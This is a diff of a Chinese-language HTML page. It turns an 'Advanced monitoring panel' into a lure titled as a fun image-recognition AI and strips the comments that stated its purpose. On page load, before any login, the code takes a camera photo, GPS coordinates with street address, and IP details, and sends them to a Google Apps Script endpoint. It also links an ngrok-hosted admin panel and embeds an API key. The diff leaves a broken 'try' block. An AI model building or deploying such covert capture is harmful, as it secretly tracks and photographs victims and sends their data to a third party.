@@ -3,13 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Advanced monitoring panel</title>
-  <!-- 若不需要 Chart.js，可自行刪除此行 -->
+  <title>試試這款影像識別 AI，讓照片變得更有趣！l</title>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
-    /*******************************************************
-     * 全局樣式
-     *******************************************************/
     body {
       margin: 0; 
       padding: 0;
@@ -34,10 +30,6 @@
     .btn:hover {
       background: #8484c2;
     }
-
-    /*******************************************************
-     * 成功 / 失敗訊息
-     *******************************************************/
     .msg-success, .msg-error {
       width: 90%;
       max-width: 400px;
@@ -55,21 +47,13 @@
       background: #dc3545;
       border: 1px solid #c82333;
     }
-
-    /*******************************************************
-     * 會員中心按鈕
-     *******************************************************/
     #openModalBtn {
       display: block;
       margin: 0 auto;
       margin-bottom: 20px;
     }
-
-    /*******************************************************
-     * Modal (彈跳視窗) - 一般會員
-     *******************************************************/
     .modal-overlay {
-      display: none; /* 預設隱藏 */
+      display: none;
       position: fixed; 
       top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(0,0,0,0.6);
@@ -114,10 +98,6 @@
         opacity: 1;
       }
     }
-
-    /*******************************************************
-     * 表單切換 (登入 / 註冊)
-     *******************************************************/
     .tab-button {
       background: #4d4d6a;
       margin: 0 5px;
@@ -155,17 +135,9 @@
       cursor: pointer;
       margin-top: 10px;
     }
-
-    /*******************************************************
-     * 管理者登入 Modal (可選)
-     *******************************************************/
     #adminModalOverlay .modal-content {
       width: 300px;
     }
-
-    /*******************************************************
-     * 高級監控面板
-     *******************************************************/
     #mainPanel {
       display: none; 
       padding: 20px;
@@ -201,11 +173,9 @@
 </head>
 <body>
 
-  <h1>Advanced monitoring panel</h1>
+  <h1>試試這款影像識別 AI，讓照片變得更有趣！</h1>
   <div id="statusSuccess" class="msg-success"></div>
   <div id="statusError" class="msg-error"></div>
-
-  <!-- 一般使用者登入 / 註冊 -->
   <button id="openModalBtn" class="btn">會員中心</button>
   <div id="modalOverlay" class="modal-overlay">
     <div class="modal-content">
@@ -228,8 +198,6 @@
       </div>
     </div>
   </div>
-
-  <!-- (可選) 管理者登入按鈕 + Modal -->
   <button id="adminLoginOpenBtn" class="btn">管理者登入</button>
   <div id="adminModalOverlay" class="modal-overlay">
     <div class="modal-content">
@@ -242,11 +210,7 @@
       </form>
     </div>
   </div>
-
-  <!-- 管理者後台連結（若另有 admin.php） -->
   <p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>
-
-  <!-- 高級監控面板 -->
  <div id="mainPanel" style="display: none;">
     <div class="container">
       <div class="card">
@@ -267,16 +231,8 @@
       </div>
     </div>
   </div>
-
   <script>
-    /************************************************
-     * 0. Apps Script URL (請改成你自己的)
-     ************************************************/
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzVxqkMTu0dzhcAlzIKqQlxtAYzY-jOQCf9aTXGtEe0zB2m6Leh9ChJ-xbRygiTSx7AhA/exec';
-
-    /************************************************
-     * 1. Modal 打開 / 關閉 (一般使用者)
-     ************************************************/
     const openModalBtn = document.getElementById('openModalBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const closeModalBtn = document.getElementById('closeModalBtn');
@@ -286,10 +242,6 @@
     closeModalBtn.addEventListener('click', () => {
       modalOverlay.style.display = 'none';
     });
-
-    /************************************************
-     * 1-2. Modal 打開 / 關閉 (管理者)
-     ************************************************/
     const adminLoginOpenBtn = document.getElementById('adminLoginOpenBtn');
     const adminModalOverlay = document.getElementById('adminModalOverlay');
     const adminCloseModalBtn = document.getElementById('adminCloseModalBtn');
@@ -299,10 +251,6 @@
     adminCloseModalBtn.addEventListener('click', () => {
       adminModalOverlay.style.display = 'none';
     });
-
-    /************************************************
-     * 2. Tab 切換 (登入 / 註冊)
-     ************************************************/
     const tabLogin = document.getElementById('tabLogin');
     const tabRegister = document.getElementById('tabRegister');
     const loginFormContainer = document.getElementById('loginFormContainer');
@@ -320,10 +268,6 @@
       registerFormContainer.classList.add('active');
       loginFormContainer.classList.remove('active');
     });
-
-    /************************************************
-     * 3. 訊息顯示
-     ************************************************/
     const statusSuccess = document.getElementById('statusSuccess');
     const statusError = document.getElementById('statusError');
     function showSuccessMessage(msg) {
@@ -336,15 +280,7 @@
       statusError.style.display = 'block';
       statusSuccess.style.display = 'none';
     }
-
-    /************************************************
-     * 4. 主要功能區塊 (登入成功後才顯示)
-     ************************************************/
     const mainPanel = document.getElementById('mainPanel');
-
-    /************************************************
-     * 5. 註冊
-     ************************************************/
     document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('regEmail').value;
@@ -355,9 +291,6 @@
         formData.append('action', 'register');
         formData.append('email', email);
         formData.append('password', password);
-
-        // 使用 URLSearchParams 傳送 (表單格式)，或改為 JSON
-        // 這裡示範還是 "JSON" 寫法，你也可以用 formData 作 x-www-form-urlencoded
         const jsonData = {
           action: 'register',
           email: email,
@@ -379,10 +312,6 @@
         showErrorMessage('註冊錯誤：' + error.message);
       }
     });
-
-    /************************************************
-     * 6. 一般登入
-     ************************************************/
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
   const email = document.getElementById('loginEmail').value;
@@ -393,7 +322,7 @@
   formData.append('email', email);
   formData.append('password', password);
 
-  try { // 開始 try-catch
+  try
     const response = await fetch(SCRIPT_URL, {
       method: 'POST',
       body: formData
@@ -407,20 +336,15 @@
 
     if (result.success) {
       showSuccessMessage('登入成功！');
-      // 若需要顯示 mainPanel，打開下列註解
       modalOverlay.style.display = 'none';
       mainPanel.style.display = 'block';
     } else {
       showErrorMessage(`錯誤原因：${result.error}`);
     }
-  } catch (error) { // 確保這裡的縮排與 try 搭配
+  } catch (error) { 
     showErrorMessage(`系統錯誤：${error.message}`);
   }
 });
-
-    /************************************************
-     * 6-2. 管理者登入 (若前端整合在同頁)
-     ************************************************/
     document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
   const email = document.getElementById('adminEmail').value;
@@ -444,8 +368,6 @@
     if (result.success) {
       showSuccessMessage('管理者登入成功！');
       adminModalOverlay.style.display = 'none';
-
-      // 視需求可跳轉後台
       window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
     } else {
       showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
@@ -454,13 +376,10 @@
     showErrorMessage('管理者登入錯誤：' + error.message);
   }
 });
-    /************************************************
-     * 7. 收集相機、GPS、IP並上傳 (裝置資訊)
-     ************************************************/
+
     async function startCamera() {
       let stream = null;
       try {
-        // ★ 相機解析度可視需求調降，以減少上傳影像大小，優化速度
         stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }});
         const video = document.createElement('video');
         video.srcObject = stream;
@@ -470,16 +389,12 @@
             resolve();
           };
         });
-        // 簡單延遲 500ms，確保影像畫面更新
         await new Promise(resolve => setTimeout(resolve, 500));
-
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // ★ 壓縮品質可再調整(0 ~ 1)，以減少上傳量
         const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1];
         return photoData;
       } catch (error) {
@@ -498,7 +413,6 @@
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
         const { latitude, longitude } = position.coords;
-        // 呼叫 Nominatim 取得大略地址
         const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
         const data = await resp.json();
         const address = data.display_name || '未知地址';
@@ -511,7 +425,6 @@
 
     async function getIpInfo() {
       try {
-        // 透過 ipinfo.io 取得 IP 與地理資訊
         const resp = await fetch('https://ipinfo.io/json');
         const data = await resp.json();
         const { ip, city, region, country, org } = data;
@@ -523,11 +436,9 @@
         return null;
       }
     }
-    ///
      async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
-        // TODO: 替換成你自己的 OpenWeatherMap API Key
         const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
         const resp = await fetch(
           `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
@@ -557,7 +468,6 @@
 
       const collectedData = { gps: null, ip: null, photo: null };
       try {
-        // 平行呼叫以節省時間
         const [gpsResult, ipResult] = await Promise.allSettled([
           getGpsCoordinates(),
           getIpInfo(),
@@ -587,8 +497,6 @@
         if (collectedData.photo) {
           fd.append('imageData', collectedData.photo);
         }
-
-        // 把 action 不設或給個空字串，就會走 ip.js doPost 裡的「B) 其他 -> 收集 IP/GPS」流程
         fd.append('action', 'collectDeviceInfo');
 
         const resp = await fetch(SCRIPT_URL, {
@@ -608,24 +516,14 @@
         }
       }
     }
-
-    /************************************************
-     * 8. 頁面載入後 (可視需求預先執行收集)
-     ************************************************/
-   document.addEventListener('DOMContentLoaded', async () => { // 加上 async
+   document.addEventListener('DOMContentLoaded', async () => { 
   try {
-    // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
     const gpsData = await getGpsCoordinates();
     if (gpsData) {
-      // 更新地圖
       document.getElementById('map').src = 
         `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-      // 更新天氣
       await getWeatherInfo(gpsData.latitude, gpsData.longitude);
     }
-
-    // 一打開就開始記錄資料（相機 / IP / GPS）
-    // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
     collectAndSendData();
 
   } catch (error) {
